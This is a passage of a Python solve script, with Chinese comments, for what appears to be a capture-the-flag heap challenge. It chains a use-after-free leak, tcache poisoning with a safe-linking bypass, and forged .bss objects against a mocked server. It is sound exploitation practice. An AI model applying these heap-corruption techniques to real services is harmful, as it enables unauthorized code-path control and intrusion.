    """`RLERALY5` @pie+0x6070 —— 逐条按 asm 0x1df0..0x1ff4 还原。
    四个 H8 的实参全部来自寄存器的滞留值，Ghidra 只显示了 1 个/4 个，必须按 asm 补：
      h1' rsi=c0 rdx=c8 rcx=&permit r8=0x62c8
      h2' rsi=s220 rdx=3  rcx=sk[0x1f8] r8=h1'
      h3' rsi=h1' rdx=h2' rcx=&relay r8=permit+0x48
      h4' rsi=h2' rdx=h3' rcx=permit+0x50 r8=**c0**   ← [rbp-0x170] 在 0x1e2d 被写成 sk[0x1c0]
    """
    hk = {'d0': sk['d0'], 'd8': sk['d8'], 'e0': sk['e0'], 'e8': sk['e8']}
    O = bytearray(0x70)

    def put(o, v):
        O[o:o + 8] = (v & M).to_bytes(8, 'little')

    pmt_xor = struct.unpack_from('<Q', permit, 0x58)[0]
    pmt_h3 = struct.unpack_from('<Q', permit, 0x48)[0]
    pmt_h4 = struct.unpack_from('<Q', permit, 0x50)[0]
    c0, c8, f8, s220 = sk['c0'], sk['c8'], sk['f8'], sk['s220']
    put(0x00, 0x3559414c45524c52)          # "RLERALY5"（作者的字面串，非 RLRELAY5）
    put(0x08, 5)
    put(0x10, c0)
    put(0x18, c8)
    put(0x20, pie + 0x6270)
    put(0x28, pmt_xor)                     # == 0x62c8
    put(0x30, s220)
    put(0x38, 3)
    h1 = H8(0x3559414c45524c42, c0, c8, pie + 0x6270, pmt_xor, hk)
    put(0x40, h1)
    h2 = H8(0x3559414c45524c72, s220, 3, f8, h1, hk)
    put(0x48, h2)
    h3 = H8(0x3559414c45524c62, h1, h2, pie + 0x6070, pmt_h3, hk)
    put(0x50, h3)
    h4 = H8(0x3559414c45524c12, h2, h3, pmt_h4, c0, hk)
    put(0x58, h4)
    put(0x60, (h1 ^ pmt_xor ^ rol(h2, 0x0d) ^ rol(h3, 0x1f) ^ ror(h4, 0x0b)) & M)
    put(0x68, 1)
    return bytes(O)


def lg_gely_fields(sk, idx, ptr, pie):
    """`RLGRELY5` 对象（calloc(0x1f8)）；xor 常量是 &0x6070。"""
    hk = {'d0': sk['d0'], 'd8': sk['d8'], 'e0': sk['e0'], 'e8': sk['e8']}
    u19 = hh((MAGIC_LG_GELY ^ sk['c0'] ^ idx) & M) ^ ptr
    u27 = H8((MAGIC_LG_GELY ^ 0x10) & M, sk['c8'], sk['c0'], idx, sk['s220'], hk)
    u8 = H8((MAGIC_LG_GELY ^ 0x20) & M, u19, u27, sk['f0'] if idx == 0 else sk['f8'], idx, hk)
    return u19, u27, u8


def lg_manf_fields(sk, idx, ptr):
    """FUN_00102e10：两个 RLGMANF5 对象（calloc(0x98)）。"""
    hk = {'d0': sk['d0'], 'd8': sk['d8'], 'e0': sk['e0'], 'e8': sk['e8']}
    u19 = hh((MAGIC_LG_MANF ^ sk['c0'] ^ idx) & M) ^ ptr
    u27 = H8((MAGIC_LG_MANF ^ 0x10) & M, sk['c8'], sk['c0'], idx, sk['s220'], hk)
    u8 = H8((MAGIC_LG_MANF ^ 0x20) & M, u19, u27, sk['f0'] if idx == 0 else sk['f8'], idx, hk)
    return u19, u27, u8


class LGServerHeap(CCServerHeap):
    """复用同一个 safe-linking 堆模型，实现 routeledger 的 op 0x20..0x24。"""

    KEY = 0x2380          # key 结构体（0x230）在这个模型里的落点

    def rd(self, off):
        return self.rd64(self.pie + self.KEY + off)

    def wr(self, off, v):
        self.wr64(self.pie + self.KEY + off, v)

    def __init__(self, pie=0x555555554000, seed=None):
        import random as _r
        self.pie = pie
        self.bss = bytearray(0x8000)   # routeledger 的 .bss 用到 0x62d8
        self.chunks, self.csize, self.tc = {}, {}, {}
        self.brk, self.tcache_key = self.HEAP + 0x1000, self.HEAP
        self.last_seq = 0
        rnd = _r.Random(seed)
        R = lambda: rnd.getrandbits(64)      # noqa: E731
        self.k = dict(c0=R(), c8=R(), d0=R(), d8=R(), e0=R(), e8=R(), f0=R(), f8=R(),
                      s200=R(), s208=R(), s210=R(), s218=R(), s220=R())
        self.sk = dict(self.k)
        self.pairs = lg_pairs(dict(self.k, pie=pie))
        names = list(LG_MAGIC)
        rnd.shuffle(names)
        self.order = names
        for i, nm in enumerate(names):       # key 结构体（0x230 堆块）
            self.wr(0x00 + 16 * i, LG_MAGIC[nm])
            self.wr(0x08 + 16 * i, self.pairs[nm])
        for i in range(0x20):
            self.wr(0xC0 + 8 * i, hh(self.k['c0'] ^ i ^ LG_MODV5))
        for o, f in ((0x1C0, 'c0'), (0x1C8, 'c8'), (0x1F0, 'f0'), (0x1F8, 'f8'),
                     (0x220, 's220')):
            self.wr(o, self.k[f])
        for i, f in enumerate(('d0', 'd8', 'e0', 'e8')):
            self.wr(0x1D0 + 8 * i, self.k[f])
        for i, f in enumerate(('s200', 's208', 's210', 's218')):
            self.wr(0x200 + 8 * i, self.k[f])
        self.used, self.unlocked = 0, 0
        self.objs, self.freed, self.ptr = [0, 0], 0, 0
        self.objsb = [0, 0]
        self.freedb, self.ptrb = 0, 0
        self.done24 = 0
        self.done34 = 0
        self.done40 = 0

    def hk(self):
        return {'d0': self.k['d0'], 'd8': self.k['d8'], 'e0': self.k['e0'], 'e8': self.k['e8']}

    def _permit_gate(self):
        """FUN_00102bc0 @0x2bc0，逐条按 asm。读 .bss 0x6270 的 LPERMIT5。"""
        r = lambda o: struct.unpack_from('<Q', self.bss, o)[0]   # noqa: E731
        hk = self.hk()
        if r(0x6270) != 0x3554494d5245504c or r(0x6278) != 5:
            return False
        if r(0x6280) != self.k['c0'] or r(0x6288) != self.k['c8']:
            return False
        if r(0x6290) != self.pie + 0x6270 or r(0x6298) != self.pie + 0x6070:
            return False
        if r(0x62A0) != self.k['s220'] or r(0x62D0) != 1:
            return False
        h1 = H8(0x3554494d5245505c, self.k['c0'], self.k['c8'],
                self.pie + 0x6270, self.pie + 0x6070, hk)
        h2 = H8(0x3554494d5245506c, self.k['s220'], h1, self.k['f0'], self.k['f8'], hk)
        h3 = H8(0x3554494d5245507c, h1, h2, self.pie + 0x6270, self.k['s220'], hk)
        h4 = H8(0x3554494d5245500c, h2, h3, self.pie + 0x6070, self.k['c8'], hk)
        if (r(0x62A8), r(0x62B0), r(0x62B8), r(0x62C0)) != (h1, h2, h3, h4):
            return False
        want = (self.k['f8'] ^ self.k['f0'] ^ h1 ^ rol(h2, 0x0b)
                ^ rol(h3, 0x1d) ^ ror(h4, 0x11))
        return r(0x62C8) == (want & M)

    def _relay_gate(self):
        """op 0x40 @0x1df0..0x1ff4，逐条按 asm。读 .bss 0x6070 的 RLERALY5。"""
        r = lambda o: struct.unpack_from('<Q', self.bss, o)[0]   # noqa: E731
        hk = self.hk()
        if r(0x6070) != 0x3559414c45524c52 or r(0x6078) != 5:
            return False
        if r(0x6080) != self.k['c0'] or r(0x6088) != self.k['c8']:
            return False
        if r(0x6090) != self.pie + 0x6270 or r(0x6098) != r(0x62C8):
            return False
        if r(0x60A0) != self.k['s220'] or r(0x60A8) != 3 or r(0x60D8) != 1:
            return False
        pmt_xor = r(0x62C8)
        h1 = H8(0x3559414c45524c42, self.k['c0'], self.k['c8'],
                self.pie + 0x6270, pmt_xor, hk)
        h2 = H8(0x3559414c45524c72, self.k['s220'], 3, self.k['f8'], h1, hk)
        h3 = H8(0x3559414c45524c62, h1, h2, self.pie + 0x6070, r(0x62B8), hk)
        h4 = H8(0x3559414c45524c12, h2, h3, r(0x62C0), self.k['c0'], hk)
        if (r(0x60B0), r(0x60B8), r(0x60C0), r(0x60C8)) != (h1, h2, h3, h4):
            return False
        want = h1 ^ pmt_xor ^ rol(h2, 0x0d) ^ rol(h3, 0x1f) ^ ror(h4, 0x0b)
        return r(0x60D0) == (want & M)

    def reply(self, op, a, b, seq, payload=b''):
        return (struct.pack('<I', 0x10 + len(payload))
                + struct.pack('<IBBBB', L5.reply_magic, op, a, b, 0)
                + struct.pack('<II', len(payload), seq) + payload)

    def handle(self, raw):
        (total,) = struct.unpack_from('<I', raw, 0)
        magic, op, sub, aux, _z = struct.unpack_from('<IBBBB', raw, 4)
        blen, seq = struct.unpack_from('<II', raw, 12)
        assert magic == L5.magic and blen == total - 0x10 and seq > self.last_seq
        self.last_seq = seq
        body = raw[20:4 + total]
        n = len(body)
        if op == 0x7F and n == 0:
            return self.reply(0x70, sub, aux, seq, struct.pack(
                '<6Q', self.rd(0x200), self.rd(0x208), self.rd(0x210),
                self.rd(0x218), LG_MODV5, 5))
        if op == 0x10:
            if sub >= 4 or (self.used >> sub) & 1 or not 1 <= n <= 0x20F or n & 0xF:
                return self.reply(0xE1, sub, aux, seq)
            try:
                out = LGServer._vm(self, sub, n, body)
            except AssertionError:
                return self.reply(0xE1, sub, aux, seq)
            self.used |= 1 << sub
            return self.reply(0x80, sub, aux, seq, out)
        if op == 0x11:
            if n != 0x10 or self.used != 0xF or self.unlocked:
                return self.reply(0xE1, sub, aux, seq)
            hk = self.hk()
            v1 = H8(0x354b434f4c4e554c, self.k['c0'], self.k['c8'], self.k['s220'],
                    self.k['f0'], hk)
            v2 = H8(0x354b434f4c4e544c, v1, self.k['f8'], self.k['s200'], self.k['s218'], hk)
            if body == struct.pack('<QQ', v1, v2):
                self.unlocked = 1
                return self.reply(0x81, sub, aux, seq)
            return self.reply(0xE1, sub, aux, seq)
        if not self.unlocked:
            return self.reply(0xE1, sub, aux, seq)
        if op == 0x20 and n == 0:                          # 造 2 个 RLGMANF5
            if self.objs[0] or self.objs[1]:
                return self.reply(0xE1, sub, aux, seq)
            for i in range(2):
                p = self.alloc(LG_OBJ)
                u19, u27, u8 = lg_manf_fields(self.sk, i, p)
                self.wr64(p + 0x10, u19)
                self.wr64(p + 0x18, u27)
                self.wr64(p + 0x20, u8)
                self.objs[i] = p
            return self.reply(0x90, sub, aux, seq)
        if op == 0x21 and n == 0:
            if not self.objs[0]:
                return self.reply(0xE1, sub, aux, seq)
            self.free(self.objs[0], LG_OBJ)
            self.free(self.objs[1], LG_OBJ)
            self.freed, self.ptr = 1, self.objs[1]
            return self.reply(0x91, sub, aux, seq)
        if op == 0x22 and n == 0:
            if not self.freed:
                return self.reply(0xE1, sub, aux, seq)
            return self.reply(0x92, sub, aux, seq, self.rd_bytes(self.ptr, 0x28))
        if op == 0x23 and n == 0x10:                       # ★ 投毒
            if not self.freed or self.done24:
                return self.reply(0xE1, sub, aux, seq)
            b0, b8 = struct.unpack_from('<QQ', body, 0)
            if b0 != ((self.ptr >> 12) ^ (self.pie + 0x6270)):
                return self.reply(0xE1, sub, aux, seq)
            want = H8(0x35464e414d474c62, b0, self.ptr, self.pie + 0x6270, self.k['s220'],
                      self.hk())
            if b8 != want:
                return self.reply(0xE1, sub, aux, seq)
            self.wr64(self.ptr, b0)
            return self.reply(0x93, sub, aux, seq)
        if op == 0x30 and n == 0:                          # 需 LPERMIT5 门通过
            if not self._permit_gate():
                return self.reply(0xE1, sub, aux, seq)
            if self.objsb[0] or self.objsb[1]:
                return self.reply(0xE1, sub, aux, seq)
            for i in range(2):
                p = self.alloc(LG_BIG)
                u19, u27, u8 = lg_gely_fields(self.sk, i, p, self.pie)
                self.wr64(p + 0x10, u19)
                self.wr64(p + 0x18, u27)
                self.wr64(p + 0x20, u8)
                self.objsb[i] = p
            return self.reply(0xA0, sub, aux, seq)
        if op == 0x31 and n == 0:
            if not self.objsb[0]:
                return self.reply(0xE1, sub, aux, seq)
            self.free(self.objsb[0], LG_BIG)
            self.free(self.objsb[1], LG_BIG)
            self.freedb, self.ptrb = 1, self.objsb[1]
            return self.reply(0xA1, sub, aux, seq)
        if op == 0x32 and n == 0:
            if not self.freedb:
                return self.reply(0xE1, sub, aux, seq)
            return self.reply(0xA2, sub, aux, seq, self.rd_bytes(self.ptrb, 0x28))
        if op == 0x33 and n == 0x10:                       # ★ 第二次投毒 → 0x6070
            if not self.freedb or self.done34 or not self._permit_gate():
                return self.reply(0xE1, sub, aux, seq)
            b0, b8 = struct.unpack_from('<QQ', body, 0)
            if b0 != ((self.ptrb >> 12) ^ (self.pie + 0x6070)):
                return self.reply(0xE1, sub, aux, seq)
            pmt_xor = struct.unpack_from('<Q', self.bss, 0x62C8)[0]
            want = H8(0x35594c4552474c62, b0, self.ptrb, self.pie + 0x6070, pmt_xor,
                      self.hk())
            if b8 != want:
                return self.reply(0xE1, sub, aux, seq)
            self.wr64(self.ptrb, b0)
            return self.reply(0xA3, sub, aux, seq)
        if op == 0x34 and n == 0x3F0:                      # 2×malloc + 0x1f8 memcpy
            if not self.freedb or self.done34 or not self._permit_gate():
                return self.reply(0xE1, sub, aux, seq)
            for i in range(2):
                p = self.alloc(LG_BIG)
                self.wr_bytes(p, body[LG_BIG * i:LG_BIG * (i + 1)])
            self.done34 = 2
            return self.reply(0xA4, sub, aux, seq)
        if op == 0x40 and n == 0:                          # RLERALY5 门
            if self.done34 != 2 or not self.done24 or self.done40:
                return self.reply(0xE1, sub, aux, seq)
            if self._relay_gate():
                self.done40 = 1
                return self.reply(0xB0, sub, aux, seq, b'RL5/COUNCIL')
            return self.reply(0xE1, sub, aux, seq)
        if op == 0x24 and n == 0x130:                      # 2×malloc + 0x98 memcpy
            if not self.freed or self.done24:
                return self.reply(0xE1, sub, aux, seq)
            for i in range(2):
                p = self.alloc(LG_OBJ)
                self.wr_bytes(p, body[LG_OBJ * i:LG_OBJ * (i + 1)])
            self.done24 = 1
            return self.reply(0x94, sub, aux, seq)
        return self.reply(0xE1, sub, aux, seq)


def lg_full_chain(conn):
    """L5：泄漏 → 解锁 → tcache 投毒 → 写 LPERMIT5 → op 0x30 过 permit 门（无 poke）。"""
    sk = lg_leak_keys(conn)                                    # 1..5
    r = conn.xact(0x11, lg_unlock_body(sk))                    # 6
    assert r.op == 0x81, f'unlock -> {r.op:#x}'
    r = conn.xact(0x20)                                        # 7 造 2 个 RLGMANF5
    assert r.op == 0x90, f'0x20 -> {r.op:#x}'
    r = conn.xact(0x21)                                        # 8 free
    assert r.op == 0x91, f'0x21 -> {r.op:#x}'
    r = conn.xact(0x22)                                        # 9 UAF 泄漏
    assert r.op == 0x92, f'0x22 -> {r.op:#x}'
    _fd, _tc, obj10 = struct.unpack_from('<3Q', r.payload, 0)
    chunk = obj10 ^ hh((MAGIC_LG_MANF ^ sk['c0'] ^ 1) & M)     # 堆地址
    poison = (chunk >> 12) ^ (sk['pie'] + 0x6270)              # safe-linking 编码
    hk = {'d0': sk['d0'], 'd8': sk['d8'], 'e0': sk['e0'], 'e8': sk['e8']}
    b8 = H8(0x35464e414d474c62, poison, chunk, sk['pie'] + 0x6270, sk['s220'], hk)
    r = conn.xact(0x23, struct.pack('<QQ', poison, b8))        # 10 投毒
    assert r.op == 0x93, f'0x23 -> {r.op:#x}'
    permit = lg_permit_object(sk, sk['pie'])                   # asm 还原的 LPERMIT5
    payload = bytes(LG_OBJ) + permit + bytes(LG_OBJ - len(permit))
    r = conn.xact(0x24, payload)                               # 11 写 0x98 @ .bss+0x6270
    assert r.op == 0x94, f'0x24 -> {r.op:#x}'
    r = conn.xact(0x30)                                        # 12 ★ 必须过 FUN_00102bc0
    assert r.op == 0xA0, f'op 0x30 -> {r.op:#x}（0xA0 才说明 LPERMIT5 全部字段算对）'

    # ── 第二段：RLERALY5 @0x6070（同样 free → UAF 泄 → 投毒 → memcpy）──
    r = conn.xact(0x31)                                        # 13 free 2×0x1f8
    assert r.op == 0xA1, f'0x31 -> {r.op:#x}'
    r = conn.xact(0x32)                                        # 14 UAF 泄漏
    assert r.op == 0xA2, f'0x32 -> {r.op:#x}'
    _fd, _tc, obj10 = struct.unpack_from('<3Q', r.payload, 0)
    chunk_b = obj10 ^ hh((MAGIC_LG_GELY ^ sk['c0'] ^ 1) & M)
    poison_b = (chunk_b >> 12) ^ (sk['pie'] + 0x6070)
    pmt_xor = struct.unpack_from('<Q', permit, 0x58)[0]
    b8 = H8(0x35594c4552474c62, poison_b, chunk_b, sk['pie'] + 0x6070, pmt_xor, hk)
    r = conn.xact(0x33, struct.pack('<QQ', poison_b, b8))       # 15 投毒 → 0x6070
    assert r.op == 0xA3, f'0x33 -> {r.op:#x}'
    relay = lg_relay_object(sk, sk['pie'], permit)
    body34 = bytes(LG_BIG) + relay + bytes(LG_BIG - len(relay))
    r = conn.xact(0x34, body34)                                # 16 写 0x1f8 @ .bss+0x6070
    assert r.op == 0xA4, f'0x34 -> {r.op:#x}'
    r = conn.xact(0x40)                                        # 17 ★ RLERALY5 门
    assert r.op == 0xB0, f'op 0x40 -> {r.op:#x}（0xB0 才说明 RLERALY5 全部字段算对）'
    assert r.payload == b'RL5/COUNCIL', r.payload
    return dict(sk=sk, chunk=chunk, poison=poison, permit=permit,
                relay=relay, chunk_b=chunk_b, poison_b=poison_b)


def selftest_l5_write():
    srv = LGServerHeap(seed=55)
    conn = Conn(L5, _Pipe(srv))
    info = lg_full_chain(conn)
    got = srv.rd_bytes(srv.pie + 0x6270, 0x98)
    assert got[:0x68] == info['permit'], '落地内容不一致'
    print('[l5] L5 全链（12 请求，无 poke；LPERMIT5 门由 mock 按 asm 0x2bc0 独立验算）：')
    print(f'     chunk     = {info["chunk"]:#x}   (= obj[0x10] ^ hh(c0^1^"RLGMANF5"))')
    print(f'     tcache fd = {info["poison"]:#018x} = (chunk>>12) ^ (PIE+0x6270)')
    print(f'     0x6270 收到 0x98 字节，首 8 字节 = {got[:8]!r}')
    print('     op 0x30 -> 0xA0  ⇒ LPERMIT5 的 8 个字段 + 4 段 H8 + xor 全对')
    got_b = srv.rd_bytes(srv.pie + 0x6070, 0x70)
    assert got_b == info['relay'], '第二段落盘不一致'
    print(f'     chunk_b   = {info["chunk_b"]:#x}  tcache fd = {info["poison_b"]:#018x}')
    print(f'     0x6070 收到 RLERALY5，op 0x40 -> 0xB0 + {b"RL5/COUNCIL"!r}')
    print('     ⇒ L5 的 0x40 门（4 段滞留寄存器实参的 H8 + xor）也全对')
    return 0


if __name__ == '__main__':
    sys.exit(main())
